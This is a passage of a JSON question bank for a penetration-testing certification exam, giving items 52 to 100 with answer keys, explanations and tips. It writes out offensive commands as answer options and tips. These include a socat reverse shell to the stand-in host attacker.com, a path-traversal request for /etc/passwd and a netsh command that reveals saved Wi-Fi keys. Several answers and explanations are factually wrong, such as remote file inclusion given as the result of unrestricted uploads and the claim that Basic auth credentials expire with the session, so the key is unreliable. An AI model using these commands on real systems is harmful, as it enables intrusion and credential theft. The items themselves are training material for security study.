        "`find / -perm -4000 2>/dev/null`",
        "`ps aux | grep root`",
        "`cat /etc/passwd`",
        "`netstat -tulnp`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`find / -perm -4000 2>/dev/null` lists all SUID binaries, which can be used for privilege escalation. `ps aux | grep root` lists processes owned by root but does not identify privilege escalation paths. `cat /etc/passwd` displays user information but not privileges. `netstat -tulnp` lists network connections but is unrelated to privilege escalation.",
      "examTip": "SUID binaries with improper permissions can allow privilege escalation on Linux systems."
    },
    {
      "id": 52,
      "question": "A penetration tester needs to extract credentials from a Windows system's memory. Which tool would be the MOST appropriate for this task?",
      "options": [
        "Wireshark",
        "Metasploit",
        "Mimikatz",
        "sqlmap"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Mimikatz is correct because it extracts credentials from Windows memory. Wireshark analyzes network traffic but does not extract credentials. Metasploit is an exploitation framework but lacks memory credential extraction capabilities. sqlmap is used for SQL injection, not memory analysis.",
      "examTip": "Mimikatz is widely used for extracting credentials from Windows memory dumps."
    },
    {
      "id": 53,
      "question": "Which of the following methods is commonly used to evade signature-based antivirus detection?",
      "options": [
        "Encoding payloads using Base64",
        "Employing polymorphic malware",
        "Using a strong encryption algorithm",
        "Executing a brute-force attack"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Polymorphic malware continuously changes its structure to evade detection. Base64 encoding is easily decoded by antivirus tools. Encryption does not prevent detection if the payload is executed in memory. Brute-force attacks are unrelated to antivirus evasion.",
      "examTip": "Polymorphic malware changes its code structure to bypass signature-based detection."
    },
    {
      "id": 54,
      "question": "Which of the following attack techniques exploits the way Windows resolves hostnames to redirect network traffic?",
      "options": [
        "LLMNR/NBT-NS poisoning",
        "ARP spoofing",
        "DNS cache poisoning",
        "MITM over HTTPS"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LLMNR/NBT-NS poisoning is correct because it manipulates Windows name resolution to capture NTLM hashes. ARP spoofing redirects traffic at the network layer but does not target Windows name resolution. DNS cache poisoning modifies DNS records but does not affect LLMNR/NBT-NS. MITM over HTTPS requires SSL stripping or certificate manipulation.",
      "examTip": "LLMNR/NBT-NS poisoning is commonly used to capture Windows NTLM hashes for offline cracking."
    },
    {
      "id": 55,
      "question": "Which of the following types of attacks involves sending excessive authentication requests to a victimâ€™s device to trick them into approving access?",
      "options": [
        "Pass-the-hash attack",
        "MFA fatigue attack",
        "Credential stuffing attack",
        "Session fixation attack"
      ],
      "correctAnswerIndex": 1,
      "explanation": "MFA fatigue attacks repeatedly send authentication prompts to annoy users into approving access. Pass-the-hash attacks reuse stolen NTLM hashes. Credential stuffing uses leaked credentials to log in. Session fixation forces users to authenticate with a known session ID.",
      "examTip": "MFA fatigue attacks rely on user frustration rather than technical exploits."
    },
    {
      "id": 56,
      "question": "Which of the following is an example of a valid Open Source Intelligence (OSINT) reconnaissance technique?",
      "options": [
        "Scanning a target network using Nmap",
        "Enumerating publicly available email addresses",
        "Attempting to brute-force an admin login page",
        "Exploiting a vulnerable web application"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Enumerating publicly available email addresses is an OSINT technique since it involves gathering data without active probing. Nmap scanning actively interacts with the target. Brute-forcing and exploitation are attack methods, not OSINT.",
      "examTip": "OSINT relies on publicly available data rather than active probing or exploitation."
    },
    {
      "id": 57,
      "question": "During an internal penetration test, a tester captures SMB authentication requests containing NTLM hashes. What tool would be BEST for attempting to crack these hashes?",
      "options": [
        "Burp Suite",
        "John the Ripper",
        "sqlmap",
        "Wireshark"
      ],
      "correctAnswerIndex": 1,
      "explanation": "John the Ripper is correct because it can crack NTLM hashes. Burp Suite is a web testing tool. sqlmap is used for SQL injection, and Wireshark captures network traffic but does not crack passwords.",
      "examTip": "Use John the Ripper or Hashcat for cracking NTLM hashes obtained from SMB authentication."
    },
    {
      "id": 58,
      "question": "A penetration tester finds that a target system allows unrestricted file uploads. Which of the following attacks would MOST likely be successful?",
      "options": [
        "Remote file inclusion (RFI)",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Subdomain takeover"
      ],
      "correctAnswerIndex": 0,
      "explanation": "RFI is correct because unrestricted file uploads can allow an attacker to execute remote malicious scripts. XSS involves injecting JavaScript but is unrelated to file uploads. SQL injection affects databases. Subdomain takeover exploits misconfigured DNS records, not file uploads.",
      "examTip": "Restricting file uploads to specific formats and validating input prevents RFI attacks."
    },
    {
      "id": 59,
      "question": "A penetration tester intercepts an HTTP response containing the following header:\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'none';\n```\n\nWhat security feature is this header enforcing?",
      "options": [
        "Prevention of SQL injection attacks",
        "Blocking of all JavaScript execution",
        "Forcing HTTPS connections",
        "Enforcing strong password policies"
      ],
      "correctAnswerIndex": 1,
      "explanation": "`script-src 'none'` prevents JavaScript execution, mitigating XSS risks. SQL injection protection requires server-side validation. HTTPS enforcement requires HTTP Strict Transport Security (HSTS). Strong password policies are unrelated.",
      "examTip": "Content Security Policy (CSP) helps prevent XSS by restricting script execution sources."
    },
    {
      "id": 60,
      "question": "Which of the following tools is commonly used to identify vulnerable web application endpoints?",
      "options": [
        "Gobuster",
        "Mimikatz",
        "Responder",
        "tcpdump"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Gobuster is correct because it performs directory and file brute-forcing to discover hidden endpoints. Mimikatz extracts credentials from Windows memory. Responder captures network authentication requests. tcpdump is a packet analyzer, not a web enumeration tool.",
      "examTip": "Use Gobuster or DirBuster to discover hidden files and directories on web servers."
    },
    {
      "id": 61,
      "question": "A penetration tester is analyzing an intercepted NTLM authentication hash:\n\n```\nuser::domain:11223344556677889900AABBCCDDEEFF:11223344556677889900AABBCCDDEEFF::: \n```\n\nWhich of the following attack techniques could be used to authenticate using this hash without cracking it?",
      "options": [
        "Pass-the-hash",
        "Rainbow table attack",
        "Brute-force attack",
        "Pass-the-ticket"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Pass-the-hash is correct because it allows an attacker to authenticate using the NTLM hash without cracking it. Rainbow tables and brute-force attacks attempt to recover plaintext passwords. Pass-the-ticket is an attack on Kerberos tickets, not NTLM hashes.",
      "examTip": "Pass-the-hash attacks allow authentication without knowing the actual password, making them highly effective in Windows environments."
    },
    {
      "id": 62,
      "question": "Which of the following is a primary function of the `Responder` tool?",
      "options": [
        "Intercepting and relaying SMB authentication requests",
        "Performing brute-force attacks against web applications",
        "Enumerating hidden directories on a web server",
        "Injecting malicious payloads into Windows processes"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Responder is correct because it captures and relays SMB authentication requests by exploiting LLMNR/NBT-NS poisoning. Brute-force attacks are unrelated. Web directory enumeration is performed by tools like Gobuster. Injecting payloads is done by tools like Metasploit.",
      "examTip": "Responder is a powerful tool for capturing network authentication hashes via LLMNR/NBT-NS poisoning."
    },
    {
      "id": 63,
      "question": "Which of the following techniques is commonly used to exfiltrate data from a compromised network without raising suspicion?",
      "options": [
        "Encoding data within DNS queries",
        "Opening an SSH tunnel over port 22",
        "Sending an email with an encrypted ZIP file",
        "Uploading data to an open Amazon S3 bucket"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encoding data in DNS queries is correct because DNS traffic is often not monitored for data exfiltration. SSH tunnels are often logged. Encrypted email attachments may still raise suspicion. Open S3 buckets are useful for storing stolen data but are easier to detect.",
      "examTip": "DNS tunneling is a stealthy method attackers use for data exfiltration in highly monitored environments."
    },
    {
      "id": 64,
      "question": "A penetration tester is analyzing a websiteâ€™s HTTP response headers and notices the following:\n\n```\nX-Frame-Options: SAMEORIGIN\n```\n\nWhat type of attack is this header designed to prevent?",
      "options": [
        "Clickjacking",
        "Cross-site scripting (XSS)",
        "SQL injection",
        "Session fixation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Clickjacking is correct because `X-Frame-Options: SAMEORIGIN` prevents the website from being embedded in an iframe by another site. XSS and SQL injection are prevented through input validation. Session fixation involves manipulating session IDs, which is unrelated.",
      "examTip": "The `X-Frame-Options` header helps prevent clickjacking attacks by restricting iframe embedding."
    },
    {
      "id": 65,
      "question": "Which of the following commands would a penetration tester use to identify listening ports on a target Linux machine?",
      "options": [
        "`netstat -tulnp`",
        "`whoami`",
        "`history | grep ssh`",
        "`cat /etc/passwd`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`netstat -tulnp` lists active listening ports. `whoami` shows the current user. `history | grep ssh` searches shell history for SSH commands. `cat /etc/passwd` displays user account details but does not list open ports.",
      "examTip": "Use `netstat -tulnp` or `ss -tulnp` to identify open ports on a Linux system."
    },
    {
      "id": 66,
      "question": "Which attack technique involves an attacker modifying a serialized object to execute malicious commands when deserialized?",
      "options": [
        "Insecure deserialization",
        "Command injection",
        "LDAP injection",
        "Cross-site request forgery (CSRF)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Insecure deserialization is correct because it allows attackers to modify serialized data to execute malicious commands when the object is deserialized. Command injection exploits system commands. LDAP injection targets directory services. CSRF forces user actions but does not involve serialization.",
      "examTip": "Always validate and restrict serialized data to prevent insecure deserialization attacks."
    },
    {
      "id": 67,
      "question": "Which of the following tools is commonly used to perform subdomain enumeration?",
      "options": [
        "Amass",
        "sqlmap",
        "Metasploit",
        "John the Ripper"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Amass is correct because it is designed for subdomain enumeration. sqlmap is used for SQL injection. Metasploit is an exploitation framework. John the Ripper is a password cracking tool.",
      "examTip": "Subdomain enumeration tools like Amass help discover hidden assets in a target's infrastructure."
    },
    {
      "id": 68,
      "question": "Which of the following attacks would MOST likely succeed against a web application vulnerable to XML External Entity (XXE) injection?",
      "options": [
        "Reading sensitive files from the server",
        "Injecting JavaScript into user input fields",
        "Executing arbitrary SQL queries",
        "Performing a brute-force attack on login credentials"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Reading sensitive files is correct because XXE vulnerabilities allow attackers to access local files. JavaScript injection is related to XSS. SQL injection targets databases. Brute-force attacks guess credentials, which is unrelated to XXE.",
      "examTip": "XXE attacks can expose sensitive local files by exploiting improperly configured XML parsers."
    },
    {
      "id": 69,
      "question": "A penetration tester is analyzing a captured Wi-Fi handshake. Which tool would be the BEST choice for attempting to crack the captured WPA2 password?",
      "options": [
        "Aircrack-ng",
        "Burp Suite",
        "Responder",
        "Hydra"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Aircrack-ng is correct because it is specifically designed for cracking Wi-Fi handshakes. Burp Suite is a web testing tool. Responder captures network authentication requests but does not crack Wi-Fi passwords. Hydra performs brute-force attacks on various services but is not optimized for WPA2 cracking.",
      "examTip": "Use Aircrack-ng with a strong wordlist to crack captured WPA2 handshakes."
    },
    {
      "id": 70,
      "question": "Which of the following Windows utilities can be used to create a persistent backdoor by modifying startup programs?",
      "options": [
        "`schtasks`",
        "`netsh`",
        "`ipconfig`",
        "`route`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "`schtasks` is correct because it schedules tasks that can be used to establish persistence. `netsh` manages network configurations. `ipconfig` displays network information. `route` manages routing tables but is not used for persistence.",
      "examTip": "Attackers often use `schtasks` to create scheduled tasks that execute malicious payloads on startup."
    },
    {
      "id": 71,
      "question": "A penetration tester executes the following command on a compromised Windows system:\n\n```\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n```\n\nWhat is the tester attempting to enumerate?",
      "options": [
        "User account privileges",
        "Installed software packages",
        "Persistence mechanisms",
        "Network configuration settings"
      ],
      "correctAnswerIndex": 2,
      "explanation": "Enumerating the `Run` registry key is a common method for identifying persistence mechanisms. Installed software is typically found under different registry paths. User privileges are checked using `whoami /priv`. Network settings are viewed using `ipconfig` or `netsh`.",
      "examTip": "Registry keys under `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` are often used for persistence."
    },
    {
      "id": 72,
      "question": "Which of the following attacks exploits a misconfigured CORS policy to steal sensitive data from a victimâ€™s session?",
      "options": [
        "Cross-Site Request Forgery (CSRF)",
        "Cross-Origin Resource Sharing (CORS) misconfiguration",
        "Session fixation",
        "Content injection"
      ],
      "correctAnswerIndex": 1,
      "explanation": "CORS misconfigurations allow attackers to read sensitive data across different origins. CSRF forces users to perform unintended actions. Session fixation involves forcing a user to use a known session ID. Content injection manipulates displayed web content but does not bypass CORS policies.",
      "examTip": "Improper CORS configurations can expose sensitive data to unauthorized third-party websites."
    },
    {
      "id": 73,
      "question": "Which tool would a penetration tester use to analyze memory dumps for signs of credential theft?",
      "options": [
        "Volatility",
        "sqlmap",
        "Nmap",
        "Responder"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Volatility is correct because it analyzes memory dumps for credentials, malware, and other artifacts. sqlmap is used for SQL injection. Nmap scans networks. Responder captures authentication requests but does not analyze memory dumps.",
      "examTip": "Use Volatility to analyze memory dumps for extracted credentials and malicious activity."
    },
    {
      "id": 74,
      "question": "A penetration tester intercepts the following HTTP request:\n\n```\nGET /download?file=../../../etc/passwd HTTP/1.1\nHost: target.com\n```\n\nWhich vulnerability is being exploited?",
      "options": [
        "Local File Inclusion (LFI)",
        "SQL Injection",
        "Command Injection",
        "Cross-Site Scripting (XSS)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LFI is correct because `../../../etc/passwd` is a directory traversal attack used to read sensitive files. SQL Injection manipulates databases. Command Injection executes system commands. XSS injects JavaScript into web pages.",
      "examTip": "Directory traversal attacks exploit weak file path validation to access sensitive files."
    },
    {
      "id": 75,
      "question": "Which of the following is a method for detecting rogue access points on a wireless network?",
      "options": [
        "Performing an ARP scan",
        "Using a wireless site survey tool",
        "Analyzing DNS query logs",
        "Checking system event logs"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Wireless site survey tools detect unauthorized access points. ARP scans identify IP conflicts but do not detect rogue APs. DNS logs help with domain resolution issues. System event logs do not track rogue APs.",
      "examTip": "Tools like WiGLE or Aircrack-ng can detect rogue APs by scanning for unauthorized SSIDs."
    },
    {
      "id": 76,
      "question": "Which attack technique allows an attacker to manipulate JSON Web Tokens (JWTs) by modifying the algorithm field?",
      "options": [
        "JWT null signature attack",
        "HMAC key reuse attack",
        "Padding oracle attack",
        "OpenID Connect attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A JWT null signature attack modifies the algorithm field to `none`, bypassing authentication. HMAC key reuse exploits weak signing keys. Padding oracle attacks target cryptographic padding. OpenID Connect attacks manipulate identity assertions.",
      "examTip": "Weak JWT configurations, such as allowing `none` algorithms, can lead to authentication bypass."
    },
    {
      "id": 77,
      "question": "A penetration tester executes the following command:\n\n```\nproxychains nmap -sT -Pn target.com\n```\n\nWhat is the purpose of using `proxychains` in this command?",
      "options": [
        "To anonymize the scan through a proxy server",
        "To evade IDS/IPS detection",
        "To scan for open Wi-Fi networks",
        "To perform DNS enumeration"
      ],
      "correctAnswerIndex": 0,
      "explanation": "ProxyChains routes traffic through a proxy, anonymizing the scan. IDS evasion requires other techniques like fragmentation. Scanning Wi-Fi networks is unrelated. DNS enumeration is performed using `dnsrecon` or `dig`.",
      "examTip": "ProxyChains allows penetration testers to anonymize Nmap and other tool traffic."
    },
    {
      "id": 78,
      "question": "Which of the following attack techniques relies on manipulating LDAP queries to escalate privileges?",
      "options": [
        "LDAP Injection",
        "NTLM Relay Attack",
        "Kerberoasting",
        "Pass-the-Hash"
      ],
      "correctAnswerIndex": 0,
      "explanation": "LDAP Injection manipulates directory service queries to escalate privileges. NTLM Relay captures authentication traffic. Kerberoasting extracts service account hashes. Pass-the-Hash allows authentication without password cracking.",
      "examTip": "LDAP injection occurs when user input is improperly sanitized in directory service queries."
    },
    {
      "id": 79,
      "question": "A penetration tester discovers a web application that does not validate file extensions when uploading images. What is the MOST likely risk?",
      "options": [
        "An attacker could upload a malicious PHP web shell.",
        "The application may expose sensitive database records.",
        "The application could be vulnerable to SQL injection.",
        "Session cookies could be stolen via XSS."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Uploading a malicious PHP web shell is correct because unrestricted file uploads allow execution of malicious scripts. Exposing database records would require a SQL injection vulnerability. XSS targets client-side scripts, not file uploads.",
      "examTip": "Restrict file uploads by verifying content type and preventing script execution."
    },
    {
      "id": 80,
      "question": "Which of the following techniques allows an attacker to execute malicious payloads directly in memory without writing to disk?",
      "options": [
        "Reflective DLL injection",
        "Heap spraying",
        "Shellcode obfuscation",
        "Session fixation"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Reflective DLL injection loads malicious DLLs directly into memory, avoiding disk writes. Heap spraying is used to manipulate memory for exploitation but does not execute payloads. Shellcode obfuscation disguises payloads but does not ensure memory-only execution. Session fixation involves authentication manipulation, not memory execution.",
      "examTip": "Reflective DLL injection is a stealthy technique used in fileless malware attacks."
    },
    {
      "id": 81,
      "question": "A penetration tester intercepts an HTTP request containing the following authorization header:\n\n```\nAuthorization: Basic dXNlcjpwYXNzd29yZA==\n```\n\nWhat is the security risk associated with this header?",
      "options": [
        "Credentials are transmitted in Base64, which is easily reversible.",
        "The authentication token can be reused indefinitely.",
        "The application is vulnerable to SQL injection.",
        "The request does not use encryption."
      ],
      "correctAnswerIndex": 0,
      "explanation": "Basic authentication encodes credentials in Base64, making them easy to decode. The token is only valid for the session and does not last indefinitely. SQL injection is unrelated to HTTP authentication. While HTTPS encryption is recommended, the primary issue is the encoding of credentials.",
      "examTip": "Basic authentication is insecure; use OAuth or token-based authentication instead."
    },
    {
      "id": 82,
      "question": "Which attack technique involves injecting malicious payloads into PowerShell scripts to execute commands without triggering antivirus detection?",
      "options": [
        "PowerShell obfuscation",
        "DLL hijacking",
        "Process hollowing",
        "Heap spraying"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PowerShell obfuscation disguises malicious scripts to evade detection. DLL hijacking exploits library load order. Process hollowing replaces a legitimate processâ€™s memory. Heap spraying is a memory corruption attack but does not directly involve PowerShell.",
      "examTip": "Obfuscation techniques help evade detection by disguising malicious PowerShell commands."
    },
    {
      "id": 83,
      "question": "Which of the following tools is commonly used to extract saved Wi-Fi passwords from a compromised Windows system?",
      "options": [
        "Netsh",
        "Wireshark",
        "Mimikatz",
        "Responder"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `netsh wlan show profiles` command reveals saved Wi-Fi passwords. Wireshark captures network traffic but does not retrieve stored credentials. Mimikatz extracts Windows credentials but not Wi-Fi passwords. Responder captures NTLM hashes but does not extract saved passwords.",
      "examTip": "Use `netsh wlan show profiles name=SSID key=clear` to retrieve saved Wi-Fi passwords on Windows."
    },
    {
      "id": 84,
      "question": "A penetration tester discovers that a web server allows unrestricted CORS requests. What is the potential risk?",
      "options": [
        "An attacker can execute arbitrary commands on the server.",
        "User session data can be stolen by a malicious website.",
        "The server is vulnerable to directory traversal attacks.",
        "An attacker can modify server-side database entries."
      ],
      "correctAnswerIndex": 1,
      "explanation": "Unrestricted CORS allows attackers to read user session data from another domain. Command execution requires a separate vulnerability. Directory traversal involves accessing files outside a directory. CORS does not enable direct database modification.",
      "examTip": "CORS misconfigurations can expose sensitive user data to unauthorized third-party websites."
    },
    {
      "id": 85,
      "question": "Which of the following attack types involves modifying encrypted ciphertext without knowing the encryption key?",
      "options": [
        "Padding oracle attack",
        "Pass-the-hash attack",
        "Token impersonation",
        "DLL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A padding oracle attack manipulates encrypted data without needing the decryption key. Pass-the-hash reuses NTLM hashes. Token impersonation manipulates authentication tokens. DLL injection modifies memory processes but does not involve cryptography.",
      "examTip": "Padding oracle attacks exploit cryptographic weaknesses in block cipher modes."
    },
    {
      "id": 86,
      "question": "Which of the following techniques would be effective in bypassing network-based intrusion detection systems (IDS)?",
      "options": [
        "Fragmenting payloads across multiple packets",
        "Performing a brute-force attack over an SSH tunnel",
        "Executing a denial-of-service (DoS) attack",
        "Sniffing network traffic with tcpdump"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Fragmenting payloads evades signature-based IDS by splitting malicious data across packets. Brute-force attacks over SSH are noisy and detectable. DoS attacks flood networks but do not bypass IDS. Sniffing traffic does not evade detection.",
      "examTip": "Fragmenting attack payloads can bypass IDS that rely on static signature detection."
    },
    {
      "id": 87,
      "question": "A penetration tester finds the following entry in a Linux server's `/etc/shadow` file:\n\n```\nadmin:$6$randomsalt$h2Grl7ZXbV8dQ:18658:0:99999:7:::\n```\n\nWhat does this entry indicate?",
      "options": [
        "The password is hashed using SHA-512.",
        "The account has no password set.",
        "The password is stored in plaintext.",
        "The user account is locked."
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `$6$` prefix indicates SHA-512 hashing. No password would be indicated by `!!`. Plaintext passwords are never stored in `/etc/shadow`. A locked account would show `*` or `!` instead of a hash.",
      "examTip": "Linux password hashes in `/etc/shadow` use prefixes like `$6$` for SHA-512 and `$5$` for SHA-256."
    },
    {
      "id": 88,
      "question": "Which of the following Windows binaries is commonly abused for executing remote commands?",
      "options": [
        "rundll32.exe",
        "notepad.exe",
        "calc.exe",
        "mspaint.exe"
      ],
      "correctAnswerIndex": 0,
      "explanation": "rundll32.exe is a LOLBin often abused for executing malicious commands. Notepad.exe, calc.exe, and mspaint.exe are standard applications without remote execution capabilities.",
      "examTip": "Attackers use trusted Windows binaries like `rundll32.exe` to execute malicious payloads undetected."
    },
    {
      "id": 89,
      "question": "A penetration tester captures an HTTP response containing the following header:\n\n```\nStrict-Transport-Security: max-age=31536000; includeSubDomains\n```\n\nWhat security feature does this header enforce?",
      "options": [
        "Forces the browser to use HTTPS for future requests",
        "Prevents clickjacking attacks",
        "Mitigates SQL injection vulnerabilities",
        "Blocks JavaScript execution in the browser"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Strict-Transport-Security (HSTS) ensures all future requests use HTTPS. Clickjacking is mitigated by `X-Frame-Options`. SQL injection requires input validation. JavaScript execution is controlled via Content Security Policy (CSP).",
      "examTip": "HSTS prevents downgrade attacks by forcing browsers to use HTTPS for a set period."
    },
    {
      "id": 90,
      "question": "A penetration tester is attempting to escalate privileges on a Linux system. Which file would be the BEST to examine for misconfigured sudo permissions?",
      "options": [
        "`/etc/sudoers`",
        "`/etc/shadow`",
        "`/var/log/auth.log`",
        "`/home/user/.bash_history`"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The `/etc/sudoers` file defines sudo privileges. `/etc/shadow` stores password hashes but does not control sudo access. `/var/log/auth.log` logs authentication attempts but does not configure sudo. `.bash_history` records command history but does not define privileges.",
      "examTip": "Checking `/etc/sudoers` for misconfigurations can reveal privilege escalation paths."
    },
    {
      "id": 91,
      "question": "A penetration tester is using `socat` to create a reverse shell. Which of the following commands would achieve this?",
      "options": [
        "`socat TCP-LISTEN:4444 EXEC:/bin/bash`",
        "`socat UDP-LISTEN:4444 EXEC:/bin/bash`",
        "`socat TCP:attacker.com:4444 EXEC:/bin/bash`",
        "`socat -d -d TCP4:localhost:22 STDOUT`"
      ],
      "correctAnswerIndex": 2,
      "explanation": "`socat TCP:attacker.com:4444 EXEC:/bin/bash` initiates a reverse shell by connecting to the attacker's machine. The first option creates a listener, not a reverse shell. The second uses UDP instead of TCP. The last one redirects traffic to localhost but does not create a shell.",
      "examTip": "Socat is a powerful networking tool that can be used to create both bind and reverse shells."
    },
    {
      "id": 92,
      "question": "Which of the following indicators would suggest an attacker is attempting to exploit a buffer overflow vulnerability?",
      "options": [
        "Excessive NOP sleds (`\\x90`) in input data",
        "Repeated failed login attempts",
        "Unusual DNS queries to external domains",
        "Presence of base64-encoded commands in logs"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A NOP sled (`\\x90`) is commonly used in buffer overflow exploits to guide execution flow. Failed logins indicate credential attacks. Unusual DNS queries suggest command and control activity. Base64 encoding is often seen in obfuscated payloads but is not specific to buffer overflows.",
      "examTip": "Detecting long input strings with excessive `\\x90` characters can indicate a buffer overflow attack."
    },
    {
      "id": 93,
      "question": "Which of the following tools is commonly used for privilege escalation enumeration on Windows systems?",
      "options": [
        "WinPEAS",
        "Nikto",
        "sqlmap",
        "Aircrack-ng"
      ],
      "correctAnswerIndex": 0,
      "explanation": "WinPEAS is correct because it identifies privilege escalation vectors on Windows systems. Nikto scans web vulnerabilities. sqlmap automates SQL injection attacks. Aircrack-ng is used for Wi-Fi attacks.",
      "examTip": "WinPEAS automates privilege escalation discovery by identifying misconfigurations and weak permissions."
    },
    {
      "id": 94,
      "question": "A penetration tester captures a network packet containing the following string:\n\n```\nEHLO mail.target.com\nMAIL FROM:<admin@target.com>\nRCPT TO:<victim@target.com>\nDATA\n```\n\nWhich type of attack is this most likely associated with?",
      "options": [
        "Email spoofing",
        "DNS tunneling",
        "MITM over SSL",
        "Kerberoasting"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This packet shows an SMTP conversation where an attacker is likely spoofing an email. DNS tunneling involves data exfiltration through DNS queries. MITM over SSL involves HTTPS interception. Kerberoasting targets Kerberos service accounts, not email.",
      "examTip": "Email spoofing exploits weaknesses in SMTP, but SPF, DKIM, and DMARC can help mitigate it."
    },
    {
      "id": 95,
      "question": "Which of the following is an effective method for exfiltrating data while evading network monitoring?",
      "options": [
        "Hiding data in ICMP packets",
        "Sending a large file over FTP",
        "Emailing an encrypted ZIP file",
        "Uploading files to a cloud storage service"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Hiding data in ICMP packets (ICMP tunneling) is effective for stealthy exfiltration. FTP transfers can be monitored. Encrypted ZIP files may trigger security alerts. Cloud storage uploads are often logged and monitored.",
      "examTip": "ICMP tunneling allows data exfiltration by embedding information in ping requests."
    },
    {
      "id": 96,
      "question": "A penetration tester wants to perform a relay attack against an SMB authentication request. Which tool would be the MOST appropriate?",
      "options": [
        "Impacket",
        "Hydra",
        "Metasploit",
        "sqlmap"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Impacket is correct because it includes SMB relay attack functionality. Hydra is a brute-force tool. Metasploit can perform relay attacks but is not the primary tool for this. sqlmap is for SQL injection.",
      "examTip": "Impacketâ€™s `ntlmrelayx.py` is commonly used to perform SMB relay attacks in Windows environments."
    },
    {
      "id": 97,
      "question": "Which type of attack involves manipulating a user's authentication cookie to impersonate their session?",
      "options": [
        "Session hijacking",
        "SQL injection",
        "Cross-site scripting (XSS)",
        "Password spraying"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Session hijacking is correct because it involves stealing or modifying session cookies. SQL injection targets databases. XSS injects JavaScript into web pages. Password spraying attempts to guess weak passwords across multiple accounts.",
      "examTip": "Protect against session hijacking by implementing secure, HttpOnly, and SameSite cookie attributes."
    },
    {
      "id": 98,
      "question": "Which of the following vulnerabilities would allow an attacker to escalate privileges through a scheduled task?",
      "options": [
        "Unquoted service path",
        "Pass-the-hash",
        "Kerberoasting",
        "NTLM relay attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Unquoted service paths allow privilege escalation by placing a malicious executable in a path interpreted incorrectly by Windows. Pass-the-hash, Kerberoasting, and NTLM relay are authentication attacks.",
      "examTip": "Check for unquoted service paths in Windows by running `wmic service get name,displayname,pathname`."
    },
    {
      "id": 99,
      "question": "A penetration tester is scanning a network and receives the following Nmap output:\n\n```\nPORT    STATE SERVICE\n135/tcp open  MSRPC\n139/tcp open  NetBIOS-ssn\n445/tcp open  Microsoft-ds\n```\n\nWhich of the following attack techniques would be MOST relevant?",
      "options": [
        "SMB enumeration",
        "DNS zone transfer",
        "ARP poisoning",
        "SQL injection"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMB enumeration is correct because ports 135, 139, and 445 are associated with Windows SMB services. DNS zone transfers require TCP 53. ARP poisoning targets local network traffic. SQL injection affects databases, not SMB.",
      "examTip": "Use `enum4linux` or `smbclient` to enumerate SMB shares on exposed 445/tcp services."
    },
    {
      "id": 100,
      "question": "Which of the following Windows security features can help mitigate Pass-the-Hash (PtH) attacks?",
      "options": [
        "Credential Guard",
        "LSASS injection",
        "NTLM relay",
        "Kerberos ticket reuse"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Credential Guard is correct because it isolates authentication secrets to protect against Pass-the-Hash attacks. LSASS injection is an attack technique. NTLM relay is another attack type but does not mitigate PtH. Kerberos ticket reuse does not protect against PtH.",
      "examTip": "Credential Guard uses virtualization-based security to protect stored credentials from theft."
    }
  ]
});
